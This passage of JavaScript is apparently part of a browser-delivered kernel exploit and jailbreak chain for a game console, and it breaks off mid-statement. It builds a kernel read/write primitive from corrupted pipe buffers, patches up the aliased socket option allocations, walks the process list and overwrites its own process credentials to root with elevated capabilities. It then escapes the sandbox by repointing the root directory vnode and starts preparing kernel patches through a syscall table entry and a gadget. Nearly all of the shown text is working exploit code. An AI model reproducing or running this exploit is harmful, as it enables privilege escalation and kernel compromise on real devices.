                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 1);
                                        return this.view.dv.getInt8(0);
                                    }

                                    getInt16(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 2);
                                        return this.view.dv.getInt16(0, littleEndian);
                                    }

                                    getInt32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getInt32(0, littleEndian);
                                    }

                                    getUint8(byteOffset) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 1);
                                        return this.view.dv.getUint8(0);
                                    }

                                    getUint16(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 2);
                                        return this.view.dv.getUint16(0, littleEndian);
                                    }

                                    getUint32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getUint32(0, littleEndian);
                                    }

                                    getBInt(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 8);
                                        return littleEndian
                                            ? new int64(this.view.dv.getUint32(0, true),
                                                        this.view.dv.getUint32(4, true))
                                            : new int64(this.view.dv.getUint32(4, false),
                                                        this.view.dv.getUint32(0, false));
                                    }

                                    setFloat32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setFloat32(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 4);
                                    }

                                    setFloat64(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setFloat64(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 8);
                                    }

                                    setInt8(byteOffset, value) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt8(0, value);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 1);
                                    }

                                    setInt16(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt16(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 2);
                                    }

                                    setInt32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setInt32(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 4);
                                    }

                                    setUint8(byteOffset, value) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint8(0, value);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 1);
                                    }

                                    setUint16(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint16(0, value, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 2);
                                    }

                                    setUint32(byteOffset, value, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.view.dv.setUint32(0, value >>> 0, littleEndian);
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 4);
                                    }

                                    setBInt(byteOffset, value, littleEndian = false) {
                                        const v = toI64(value);
                                        this.view.u8.fill(0);
                                        if (littleEndian) {
                                            this.view.dv.setUint32(0, v.low >>> 0, true);
                                            this.view.dv.setUint32(4, v.hi >>> 0, true);
                                        } else {
                                            this.view.dv.setUint32(0, v.hi >>> 0, false);
                                            this.view.dv.setUint32(4, v.low >>> 0, false);
                                        }
                                        this.kwrite(this.pipeBacking.add32(byteOffset),
                                                    this.dvBacking, 8);
                                    }
                                }

                                function kview(addr) {
                                    kv.pipeBacking = addr;
                                    return kv;
                                }

                                const FILEDESCENT_SIZE_KV = 8;
                                function fget(fd) {
                                    return kview(kFdtOfiles)
                                        .getBInt(fd * FILEDESCENT_SIZE_KV, true);
                                }

                                kv = new KernelView(masterPipe, slavePipe);
                                mark("KERNELVIEW", "built on master "
                                    + masterPipe + " / slave " + slavePipe
                                    + ", pipebuf scratch at " + kv.pipeBuf.addr
                                    + ", 8-byte view at " + kv.dvBacking);

                                const kvCv = kview(evfCv).getBInt(0, true);
                                let kvStr = "";
                                for (let i = 0; i < 8; ++i) {
                                    const c = kv.view.dv.getUint8(i);
                                    if (!c) break;
                                    kvStr += String.fromCharCode(c);
                                }
                                mark("KV-READ", evfCv + " -> " + kvCv
                                    + "  as text: '" + kvStr + "'");
                                check("kernelview-reads-kernel-memory-evf",
                                    kvStr === "evf cv", "got '" + kvStr + "'");

                                const fpM = fget(masterPipe[0]);
                                const fpS = fget(slavePipe[0]);
                                const dM = kview(fpM).getBInt(0, true);
                                const dS = kview(fpS).getBInt(0, true);
                                mark("KV-FGET", "master fp " + fpM + " (kread8 said "
                                    + pipeMFp + "), f_data " + dM
                                    + " (kread8 said " + pipeM + ")");
                                mark("KV-FGET", "slave  fp " + fpS + " (kread8 said "
                                    + pipeSFp + "), f_data " + dS
                                    + " (kread8 said " + pipeS + ")");
                                check("pipes-ofiles-entries-match"
                                    + "socket option read",
                                    sameI64(fpM, pipeMFp) && sameI64(fpS, pipeSFp)
                                    && sameI64(dM, pipeM) && sameI64(dS, pipeS),
                                    "two independent primitives, same four "
                                    + "kernel pointers");

                                const mCnt = kview(pipeM).getUint32(0, true);
                                const mIn = kview(pipeM).getUint32(4, true);
                                const mOut = kview(pipeM).getUint32(8, true);
                                const mSize = kview(pipeM).getUint32(0x0c, true);
                                const mBuf = kview(pipeM).getBInt(0x10, true);
                                mark("KV-PIPEBUF", "master cnt=" + mCnt + " in=" + mIn
                                    + " out=" + mOut + " size=0x" + mSize.toString(16)
                                    + " buffer=" + mBuf);
                                check("master-pipebuf-aimed-slave"
                                    + "struct pipe",
                                    mSize === PIPE_PAGE && sameI64(mBuf, pipeS),
                                    "want size=0x" + PIPE_PAGE.toString(16)
                                    + " buffer=" + pipeS);
                                check("master-pipe-drained-between-flushes",
                                    mCnt === 0 && mIn === 0 && mOut === 0,
                                    "cnt=" + mCnt + " in=" + mIn + " out=" + mOut
                                    + " -- anything else and flush() is walking "
                                    + "forward, which the pre-flight said it "
                                    + "does not");

                                if (kbase) {
                                    const ELF_N = 0x100;
                                    const ehdr = alloc(ELF_N);
                                    ehdr.u8.fill(0);
                                    const gotN = kv.kread(ehdr.addr, kbase, ELF_N);
                                    const magic = ehdr.dv.getUint32(0, true) >>> 0;
                                    const eiClass = ehdr.dv.getUint8(4);
                                    const eType = ehdr.dv.getUint16(0x10, true);
                                    const eMachine = ehdr.dv.getUint16(0x12, true);
                                    const eEntry = new int64(ehdr.dv.getUint32(0x18, true),
                                                             ehdr.dv.getUint32(0x1c, true));
                                    mark("KV-BULK", gotN + "/" + ELF_N
                                        + " bytes from " + kbase + " in ONE read(2): "
                                        + hexBytes(ehdr.u8.subarray(0, 16)));
                                    mark("KV-ELF", "magic=" + hx(magic)
                                        + " ei_class=" + eiClass + " e_type=" + eType
                                        + " e_machine=" + hx(eMachine)
                                        + " e_entry=" + eEntry);
                                    check("read2-pulled-whole-kernel-elf"
                                        + "header out of kernel memory",
                                        gotN === ELF_N && magic === ELF_MAGIC
                                        && eiClass === 2 && eMachine === 0x3e
                                        && (eType === 2 || eType === 3),
                                        "read " + gotN + " bytes, magic " + hx(magic));
                                } else {
                                    mark("KV-BULK-SKIPPED", "stage 6 found no "
                                        + "kernel base, so there is no address "
                                        + "known to have 0x100 mapped bytes");
                                }

                                const tcAddr = reqs1Aligned.add32(PKTOPTS_TCLASS);
                                function tclassGet() {
                                    tcBuf.u8.fill(0);
                                    tcLen.dv.setInt32(0, 4, true);
                                    const r = sc(SYS.getsockopt, pktoptsTwins[0],
                                        IPPROTO_IPV6, IPV6_TCLASS,
                                        tcBuf.addr, tcLen.addr).i32;
                                    return r === 0 ? (tcBuf.dv.getUint32(0, true) >>> 0)
                                                   : -1;
                                }
                                const tcSock0 = tclassGet();
                                const tcKv0 = kview(tcAddr).getUint32(0, true) >>> 0;
                                mark("KV-TCLASS", "socket says " + hx(tcSock0)
                                    + ", kv says " + hx(tcKv0) + " at " + tcAddr);
                                check("kv-getsockoptipv6_tclass-read"
                                    + "same kernel word", tcSock0 !== -1
                                    && tcSock0 === tcKv0,
                                    tcSock0 === -1 ? "getsockopt failed, so this "
                                        + "witness is unavailable" : "");

                                const KV_WITNESS = 0x4b565701;
                                kview(tcAddr).setUint32(0, KV_WITNESS, true);
                                const tcSock1 = tclassGet();
                                const tcKv1 = kview(tcAddr).getUint32(0, true) >>> 0;
                                mark("KV-WRITE", "wrote " + hx(KV_WITNESS)
                                    + " at " + tcAddr + "; socket now says "
                                    + hx(tcSock1) + ", kv says " + hx(tcKv1));
                                check("kernel-word-written-through-pipes"
                                    + "read back by the KERNEL, not by us",
                                    tcSock1 === KV_WITNESS,
                                    "getsockopt(IPV6_TCLASS) returned "
                                    + hx(tcSock1) + " -- this is the proof that "
                                    + "the write reached real kernel memory");
                                check("kv-reads-write", tcKv1 === KV_WITNESS,
                                    hx(tcKv1));

                                if (tcSock0 !== -1) {
                                    kview(tcAddr).setUint32(0, tcSock0, true);
                                    const tcSock2 = tclassGet();
                                    check("witness-field-restored",
                                        tcSock2 === tcSock0,
                                        hx(tcSock2) + " want " + hx(tcSock0));
                                }

                                const scratch = reqs1Aligned.add32(8);
                                const magic64 = new int64(0x4b565701, 0xc0de4e01);
                                kview(scratch).setBInt(0, magic64, true);
                                const back64 = kview(scratch).getBInt(0, true);
                                mark("KV-RW64", "wrote " + magic64 + " at " + scratch
                                    + ", read " + back64);
                                check("8-byte-kernel-round-trip-through",
                                    sameI64(back64, magic64), back64.toString());
                                kview(scratch).setBInt(0, 0, true);

                                let fastMs = 0;
                                {
                                    const t0 = Date.now();
                                    for (let i = 0; i < 32; ++i)
                                        kview(evfCv).getBInt(0, true);
                                    fastMs = Date.now() - t0;
                                }
                                let pageMs = 0, pageN = 0;
                                if (kbase) {
                                    const big = alloc(0x1000);
                                    const t0 = Date.now();
                                    for (let i = 0; i < 8; ++i)
                                        pageN += kv.kread(big.addr, kbase, 0x1000);
                                    pageMs = Date.now() - t0;
                                }
                                const fastBps = Math.round(32 * 8 * 1000
                                    / Math.max(1, fastMs));
                                mark("KV-BENCH", "32 eight-byte reads in " + fastMs
                                    + " ms = " + fastBps + " bytes/s   (socket "
                                    + "options managed " + slowBps + " bytes/s)");
                                if (pageN)
                                    mark("KV-BENCH-BULK", pageN + " bytes in "
                                        + pageMs + " ms = "
                                        + Math.round(pageN * 1000 / Math.max(1, pageMs))
                                        + " bytes/s in 0x1000-byte reads");
                                mark("KV-STATS", kv.flushes + " flushes, "
                                    + kv.bytesRead + " bytes read, "
                                    + kv.bytesWritten + " bytes written");

                                const kvLive = kvStr === "evf cv"
                                    && tcSock1 === KV_WITNESS;
                                if (kvLive)
                                    mark("KERNELVIEW-LIVE", "kv is the primitive "
                                        + "now. ip6po_pktinfo is not needed again "
                                        + "-- which is exactly what makes the "
                                        + "repair below possible: every write it "
                                        + "needs goes through the pipes.");

                                if (!kvLive) {
                                    mark("REPAIR-SKIPPED", "kv did not prove out, "
                                        + "so stage 7 has no write primitive it "
                                        + "can trust. Nothing is repaired and "
                                        + "nothing is closed.");
                                } else {

                                state("stage 7: repairing the aliases...", "warn");

                                const PKTOPTS_M = 0x00;
                                const PKTOPTS_RTHDR = 0x68;
                                const FILE_F_COUNT = 0x28;

                                function fhold(fp) {
                                    const before = kview(fp).getInt32(FILE_F_COUNT, true);
                                    let after = before;
                                    for (let bump = 1; bump <= 4; ++bump) {
                                        kview(fp).setInt32(FILE_F_COUNT,
                                            before + bump, true);
                                        after = kview(fp).getInt32(FILE_F_COUNT, true);
                                        if (after > before && after >= 2) break;
                                    }
                                    return { before: before, after: after };
                                }

                                function getIn6pOutputopts(fd) {
                                    const fp = fget(fd);
                                    if (!kptr(fp)) return null;
                                    const fData = kview(fp).getBInt(0, true);
                                    if (!kptr(fData)) return null;
                                    const soPcb = kview(fData).getBInt(0x18, true);
                                    if (!kptr(soPcb)) return null;
                                    const o = kview(soPcb).getBInt(0x118, true);
                                    return kptr(o) ? o : null;
                                }

                                const optsA = getIn6pOutputopts(pktoptsTwins[0]);
                                const optsB = getIn6pOutputopts(pktoptsTwins[1]);
                                const fdC = twinSocks.length ? twinSocks[0] : -1;
                                const optsC = fdC > 0 ? getIn6pOutputopts(fdC) : null;
                                const pktinfoA = optsA
                                    ? kview(optsA).getBInt(PKTOPTS_PKTINFO, true) : null;
                                const rthdrB = optsB
                                    ? kview(optsB).getBInt(PKTOPTS_RTHDR, true) : null;
                                const rthdrC = optsC
                                    ? kview(optsC).getBInt(PKTOPTS_RTHDR, true) : null;

                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                    + " in6p_outputopts=" + (optsA || "null")
                                    + "   want " + reqs1Aligned);
                                mark("REPAIR-WALK", "fd " + pktoptsTwins[1]
                                    + " ip6po_rthdr=" + (rthdrB || "null")
                                    + "   want " + reqs1Aligned);
                                mark("REPAIR-WALK", "fd " + fdC
                                    + " ip6po_rthdr=" + (rthdrC || "null")
                                    + "   want " + reqs2Addr);
                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                    + " ip6po_pktinfo=" + (pktinfoA || "null")
                                    + "   want " + pipeM.add32(8)
                                    + " (master's pipebuf.out)");

                                const walkA = !!optsA && sameI64(optsA, reqs1Aligned);
                                const walkB = !!rthdrB && sameI64(rthdrB, reqs1Aligned);
                                const walkC = !!rthdrC && sameI64(rthdrC, reqs2Addr);
                                const walkP = !!pktinfoA && sameI64(pktinfoA, pipeM.add32(8));
                                check("socket-walk-lands-chunk-stage"
                                    + "leaked, from both owners", walkA && walkB,
                                    walkA && walkB ? "in6p_outputopts and the twin's "
                                        + "ip6po_rthdr are the same allocation, and it "
                                        + "is the one the aio_entry named"
                                        : "walkA=" + walkA + " walkB=" + walkB);
                                check("0x80-chunk-second-owner-where"
                                    + "said it is", walkC,
                                    walkC ? "" : "twinSocks[0]=" + fdC
                                        + " rthdr=" + (rthdrC || "null"));
                                check("ip6po_pktinfo-points-master-pipebuf",
                                    walkP, walkP ? "" : "so this is not the pktopts "
                                        + "the pipe primitive was built on");

                                kview(reqs1Aligned).setBInt(8, 0, true);

                                const chunkX = alloc(0x100);
                                chunkX.u8.fill(0);
                                const auditN = kv.kread(chunkX.addr, reqs1Aligned, 0x100);
                                const dirtyWords = [];
                                for (let o = 8; o < 0x100; o += 8) {
                                    if (o === PKTOPTS_PKTINFO) continue;
                                    if (o === PKTOPTS_TCLASS) continue;
                                    const lo = chunkX.dv.getUint32(o, true) >>> 0;
                                    const hi = chunkX.dv.getUint32(o + 4, true) >>> 0;
                                    if (lo || hi) dirtyWords.push("+0x" + o.toString(16)
                                        + "=" + new int64(lo, hi));
                                }
                                mark("REPAIR-AUDIT", auditN + " bytes of the aliased "
                                    + "pktopts read back; head "
                                    + hexBytes(chunkX.u8.subarray(0, 16))
                                    + "   tclass=" + hx(chunkX.dv.getUint32(PKTOPTS_TCLASS, true))
                                    + "   non-zero elsewhere: "
                                    + (dirtyWords.length ? dirtyWords.join(" ") : "none"));
                                const auditOk = auditN === 0x100 && dirtyWords.length === 0;
                                check("nothing-ip6_clearpktopts-will-free"
                                    + "chunk is a pointer", auditOk,
                                    auditOk ? "every word zero except the rthdr header, "
                                        + "ip6po_pktinfo and ip6po_tclass"
                                        : "a non-zero word here becomes a free() of "
                                        + "whatever it points at");

                                const canRepair = walkA && walkB && walkC && walkP
                                    && auditOk;
                                if (!canRepair) {
                                    mark("REPAIR-REFUSED", "the repair was NOT "
                                        + "attempted. Nothing was written and nothing "
                                        + "will be closed -- an unverified repair is "
                                        + "worse than none, because it turns a known "
                                        + "reboot into an unknown one.");
                                } else {

                                    const pipeFds = [masterPipe[0], masterPipe[1],
                                                     slavePipe[0], slavePipe[1]];
                                    const expectFp = [pipeMFp, null, pipeSFp, null];
                                    let held = 0;
                                    const holdLog = [];
                                    for (let i = 0; i < pipeFds.length; ++i) {
                                        const fp = fget(pipeFds[i]);
                                        if (!kptr(fp)) {
                                            holdLog.push(pipeFds[i] + ":fp=" + fp);
                                            continue;
                                        }
                                        if (expectFp[i] && !sameI64(fp, expectFp[i])) {
                                            holdLog.push(pipeFds[i] + ":fp=" + fp
                                                + " != " + expectFp[i]);
                                            continue;
                                        }
                                        const probe = kview(fp).getInt32(FILE_F_COUNT, true);
                                        if (!(probe >= 1 && probe <= 16)) {
                                            holdLog.push(pipeFds[i] + ":f_count=" + probe
                                                + " implausible");
                                            continue;
                                        }
                                        const h = fhold(fp);
                                        holdLog.push(pipeFds[i] + ":" + h.before
                                            + "->" + h.after);

                                        if (h.after > h.before && h.after >= 2) held++;
                                    }
                                    mark("PIPE-REFCNT", holdLog.join("  "));
                                    check("four-pipe-files-hold"
                                        + "reference", held === 4,
                                        held + "/4 -- without this, closing the master "
                                        + "pipe kmem_frees slave's struct pipe, and "
                                        + "closing the slave frees whatever address its "
                                        + "pipebuf last pointed at");

                                    const masterOne = holdLog.slice(0, 2).every(
                                        function (s) { return /:1->/.test(s); });
                                    check("f_count-read-1-master-fds"
                                        + "what one fd and no other holder gives",
                                        masterOne, masterOne
                                            ? "so 0x28 is f_count. The slave pair reads "
                                            + "high because kv's own read(slave[0]) and "
                                            + "write(slave[1]) hold it while they work."
                                            : holdLog.join(" ") + " -- if these are not "
                                            + "small reference counts, 0x28 is the wrong "
                                            + "field and the hold is corrupting "
                                            + "something else");

                                    kview(optsA).setBInt(PKTOPTS_PKTINFO, 0, true);

                                    kview(optsA).setBInt(PKTOPTS_M, 0, true);
                                    kview(optsB).setBInt(PKTOPTS_RTHDR, 0, true);
                                    kview(optsC).setBInt(PKTOPTS_RTHDR, 0, true);

                                    const backA = kview(optsA).getBInt(PKTOPTS_PKTINFO, true);
                                    const backM = kview(optsA).getBInt(PKTOPTS_M, true);
                                    const backB = kview(optsB).getBInt(PKTOPTS_RTHDR, true);
                                    const backC = kview(optsC).getBInt(PKTOPTS_RTHDR, true);
                                    const zeroed = function (v) {
                                        return !!v && v.low === 0 && v.hi === 0;
                                    };
                                    mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
                                        + " ip6po_m=" + backM
                                        + " twin rthdr=" + backB
                                        + " 0x80 rthdr=" + backC);
                                    const cleared = zeroed(backA) && zeroed(backM)
                                        && zeroed(backB) && zeroed(backC);
                                    check("second-owner-reads-null"
                                        + "pointer", cleared,
                                        cleared ? "chunk X is freed once, by fd "
                                            + pktoptsTwins[0] + "; chunk Y is freed by "
                                            + "nobody and leaks 0x80 bytes"
                                            : "at least one pointer did not clear");

                                    chunkX.u8.fill(0);
                                    kv.kread(chunkX.addr, reqs1Aligned, 0x100);
                                    let leftover = 0;
                                    for (let o = 0; o < 0x100; o += 8) {
                                        if (o === PKTOPTS_TCLASS) continue;
                                        if ((chunkX.dv.getUint32(o, true) >>> 0)
                                            || (chunkX.dv.getUint32(o + 4, true) >>> 0))
                                            leftover++;
                                    }
                                    check("aliased-pktopts-entirely-zero"
                                        + "except its tclass", leftover === 0,
                                        leftover + " non-zero word(s) left -- head "
                                        + hexBytes(chunkX.u8.subarray(0, 16)));

                                    repaired = held === 4 && cleared && leftover === 0;
                                    mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
                                        repaired
                                            ? "every doubly-owned allocation now has "
                                              + "exactly one owner. cleanup() is "
                                              + "unlocked."
                                            : "the teardown stays locked; the reboot "
                                              + "banner is still correct.");
                                    if (repaired) {
                                        pipeFdsHeld = pipeFds.slice();

                                        kvProbe = function () {
                                            const w = kview(evfCv).getBInt(0, true);
                                            let s = "";
                                            for (let i = 0; i < 8; ++i) {
                                                const c = kv.view.dv.getUint8(i);
                                                if (!c) break;
                                                s += String.fromCharCode(c);
                                            }
                                            return { word: w, str: s };
                                        };
                                    }
                                }

                                if (!repaired) {
                                    mark("JAILBREAK-SKIPPED", "the repair did not "
                                        + "verify, so this run is already going to "
                                        + "ask for a reboot. Doing more kernel "
                                        + "writes on top of that is how a clean "
                                        + "failure becomes a panic.");
                                } else try {
                                    state("stage 8: jailbreak...", "warn");

                                    const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                    const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                                    const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                                    const CR_NGROUPS = 0x10, CR_RGID = 0x14, CR_SVGID = 0x18;
                                    const CR_PRISON = 0x30, CR_SCEAUTHID = 0x58;
                                    const CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                                    const CR_SCEATTR0 = 0x83;
                                    const FD_RDIR = 0x10, FD_JDIR = 0x18;
                                    const KERNEL_PID = 0;

                                    const SYSCORE_AUTHID = new int64(0x00000007, 0x48000000);

                                    let walk = curproc, steps = 0, allproc = null;
                                    while (steps < 4096) {
                                        if (inImageAddr(walk)) { allproc = walk; break; }
                                        if (!kptr(walk)) break;
                                        walk = kview(walk).getBInt(P_LIST_PREV, true);
                                        steps++;
                                    }
                                    mark("ALLPROC", (allproc || "NOT FOUND")
                                        + "   after " + steps + " le_prev step(s) "
                                        + "back from " + curproc
                                        + (allproc && kbase ? "   = kernel_base + 0x"
                                            + (allproc.low - kbase.low >>> 0).toString(16)
                                            : ""));
                                    check("allproc-reached-by-walking-p_list"
                                        + "backwards", !!allproc,
                                        allproc ? "it is a kernel image address, "
                                            + "which is what &allproc must be"
                                            : "the walk left the proc list");

                                    const procs = [];
                                    function pfind(pid) {
                                        if (!allproc) return null;
                                        let p2 = kview(allproc).getBInt(0, true);
                                        for (let n = 0; n < 4096; ++n) {
                                            if (!p2 || !kptr(p2)) return null;
                                            const q = kview(p2).getInt32(P_PID, true);
                                            if (n < 8) procs.push(q);
                                            if (q === pid) return p2;
                                            p2 = kview(p2).getBInt(P_LIST_NEXT, true);
                                            if (!p2 || p2.low === 0 && p2.hi === 0)
                                                return null;
                                        }
                                        return null;
                                    }
                                    const selfProc = pfind(myPid);
                                    const kProc = pfind(KERNEL_PID);
                                    mark("PFIND", "pid " + myPid + " -> "
                                        + (selfProc || "null") + "   pid 0 -> "
                                        + (kProc || "null")
                                        + "   first pids on the list: " + procs.slice(0, 8));
                                    check("pfind-found-proc"
                                        + "one the sigio named",
                                        !!selfProc && sameI64(selfProc, curproc),
                                        selfProc ? selfProc + " vs " + curproc
                                            : "not found -- allproc or p_pid is wrong");
                                    check("pfind-found-kernel-proc-pid",
                                        !!kProc && kptr(kProc),
                                        kProc ? kProc.toString() : "not found");

                                    if (selfProc && sameI64(selfProc, curproc) && kProc) {

                                        const uidBefore = sc(SYS.getuid).i32;
                                        const setuidBefore = sc(SYS.setuid, 0).i32;
                                        const uidAfterTry = sc(SYS.getuid).i32;
                                        mark("PRE-JAILBREAK", "getuid=" + uidBefore
                                            + "  setuid(0)=" + setuidBefore
                                            + "  getuid=" + uidAfterTry);
                                        check("process-unprivileged-before"
                                            + "the patch", uidBefore !== 0
                                            && setuidBefore === -1,
                                            "uid " + uidBefore + ", setuid(0) refused "
                                            + "-- exactly the test main.js:109 uses "
                                            + "to decide whether to jailbreak");

                                        const pathBuf = alloc(0x40);
                                        function tryOpen(path) {
                                            pathBuf.u8.fill(0);
                                            for (let i = 0; i < path.length; ++i)
                                                pathBuf.u8[i] = path.charCodeAt(i);
                                            const fd = sc(SYS.open, pathBuf.addr, 0, 0).i32;
                                            if (fd >= 0) sc(SYS.close, fd);
                                            return fd;
                                        }
                                        const PROBE_PATHS = ["/", "/system",
                                            "/mini-syscore.elf", "/system_ex"];
                                        const before = PROBE_PATHS.map(function (s) {
                                            return s + "=" + tryOpen(s);
                                        });
                                        mark("SANDBOX-BEFORE", before.join("  "));

                                        const pUcred = kview(selfProc).getBInt(P_UCRED, true);
                                        const kUcred = kview(kProc).getBInt(P_UCRED, true);
                                        const prison0 = kview(kUcred).getBInt(CR_PRISON, true);
                                        const pFdb = kview(selfProc).getBInt(P_FD, true);
                                        const kFdb = kview(kProc).getBInt(P_FD, true);
                                        const rootVnode = kview(kFdb).getBInt(FD_RDIR, true);
                                        mark("JAILBREAK-SOURCES", "p_ucred=" + pUcred
                                            + " kp_ucred=" + kUcred + " prison0=" + prison0
                                            + " p_fd=" + pFdb + " root_vnode=" + rootVnode);
                                        const srcOk = kptr(pUcred) && kptr(kUcred)
                                            && kptr(prison0) && kptr(pFdb) && kptr(rootVnode);
                                        check("structure-jailbreak-writes"
                                            + "through is a kernel pointer", srcOk,
                                            srcOk ? "" : "refusing to write");

                                        if (srcOk) {
                                            kview(pUcred).setInt32(CR_UID, 0, true);
                                            kview(pUcred).setInt32(CR_RUID, 0, true);
                                            kview(pUcred).setInt32(CR_SVUID, 0, true);
                                            kview(pUcred).setInt32(CR_NGROUPS, 1, true);
                                            kview(pUcred).setInt32(CR_RGID, 0, true);
                                            kview(pUcred).setInt32(CR_SVGID, 0, true);
                                            kview(pUcred).setBInt(CR_PRISON, prison0, true);
                                            kview(pUcred).setBInt(CR_SCEAUTHID,
                                                SYSCORE_AUTHID, true);
                                            kview(pUcred).setBInt(CR_SCECAPS1, -1, true);
                                            kview(pUcred).setBInt(CR_SCECAPS0, -1, true);
                                            kview(pUcred).setUint8(CR_SCEATTR0, 0x80);
                                            kview(pFdb).setBInt(FD_RDIR, rootVnode, true);
                                            kview(pFdb).setBInt(FD_JDIR, rootVnode, true);

                                            const back = {
                                                uid: kview(pUcred).getInt32(CR_UID, true),
                                                prison: kview(pUcred).getBInt(CR_PRISON, true),
                                                auth: kview(pUcred).getBInt(CR_SCEAUTHID, true),
                                                caps: kview(pUcred).getBInt(CR_SCECAPS0, true),
                                                attr: kview(pUcred).getUint8(CR_SCEATTR0),
                                                rdir: kview(pFdb).getBInt(FD_RDIR, true)
                                            };
                                            mark("JAILBREAK-WRITE", "cr_uid=" + back.uid
                                                + " cr_prison=" + back.prison
                                                + " cr_sceAuthId=" + back.auth
                                                + " cr_sceCaps[0]=" + back.caps
                                                + " cr_sceAttr[0]=0x" + back.attr.toString(16)
                                                + " fd_rdir=" + back.rdir);
                                            check("ucred-reads-patched",
                                                back.uid === 0
                                                && sameI64(back.prison, prison0)
                                                && sameI64(back.auth, SYSCORE_AUTHID)
                                                && back.attr === 0x80
                                                && sameI64(back.rdir, rootVnode), "");

                                            const uidNow = sc(SYS.getuid).i32;
                                            const euidNow = sc(SYS.geteuid).i32;
                                            const setuidNow = sc(SYS.setuid, 0).i32;
                                            mark("POST-JAILBREAK", "getuid=" + uidNow
                                                + " geteuid=" + euidNow
                                                + " setuid(0)=" + setuidNow);
                                            const rooted = uidNow === 0 && setuidNow === 0;
                                            check("kernel-reports-root",
                                                rooted, rooted
                                                    ? "getuid() went " + uidBefore
                                                    + " -> 0 and setuid(0) went -1 -> 0, "
                                                    + "neither of which userland can fake"
                                                    : "uid " + uidNow);

                                            const after = PROBE_PATHS.map(function (s) {
                                                return s + "=" + tryOpen(s);
                                            });
                                            mark("SANDBOX-AFTER", after.join("  "));
                                            const escaped = PROBE_PATHS.some(function (s, i) {
                                                return before[i].endsWith("=-1")
                                                    && !after[i].endsWith("=-1");
                                            });
                                            check("path-unreachable-before"
                                                + "opens now", escaped,
                                                escaped ? "fd_rdir/fd_jdir now point at "
                                                    + "the kernel's root vnode"
                                                    : "no probe path changed -- the app "
                                                    + "sandbox may already have allowed "
                                                    + "all of them, so this proves "
                                                    + "nothing either way");
                                            jailbroken = rooted;
                                        }
                                    }
                                } catch (e) {
                                    mark("JAILBREAK-THREW", (e && e.message)
                                        ? e.message : String(e));
                                }

                                const KOFF = offsetsFor(navigator.userAgent).off || {};
                                const SYSENT_661 = KOFF.k_sysent_661 !== undefined
                                    ? KOFF.k_sysent_661 : 0x1109350;
                                const JMP_RSI_GADGET = KOFF.k_jmp_rsi !== undefined
                                    ? KOFF.k_jmp_rsi : 0x71a21;
                                mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
                                    + " jmp[rsi]=0x" + JMP_RSI_GADGET.toString(16)
                                    + "   source=" + (KOFF.k_sysent_661 !== undefined
                                        ? "offsets table" : "built-in 11.00 fallback"));
                                const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
                                const MAP_SHARED = 1, MAP_FIXED = 0x10;
                                const SYS_MMAP = 0x1dd, SYS_JITSHM_CREATE = 0x215;
                                const SYS_KEXEC = 0x295;
                                const KEXEC_MAP = new int64(0x20100000, 9);

                                if (!(jailbroken && kbase && kpatch)) {
                                    mark("KPATCH-SKIPPED", "need root, a kernel base "
                                        + "and the blob; have root=" + jailbroken
                                        + " kbase=" + (kbase || "null")
                                        + " blob=" + (kpatch ? kpatch.length : 0));
                                } else try {
                                    state("stage 9: kernel patches...", "warn");
                                    const sysent = kbase.add32(SYSENT_661);
                                    const gadget = kbase.add32(JMP_RSI_GADGET);

                                    const gbuf = alloc(8);
                                    gbuf.u8.fill(0);
                                    kv.kread(gbuf.addr, gadget, 8);
                                    const gadgetOk = gbuf.u8[0] === 0xff && gbuf.u8[1] === 0x26;
                                    const wouldExecArgs = gbuf.u8[0] === 0xff
                                        && gbuf.u8[1] === 0xe6;
                                    mark("KPATCH-GADGET", gadget + " reads "
                                        + hexBytes(gbuf.u8.subarray(0, 8))
                                        + "   want ff 26 (jmp qword [rsi])");
                                    check("sysent-replacement-sy_call"
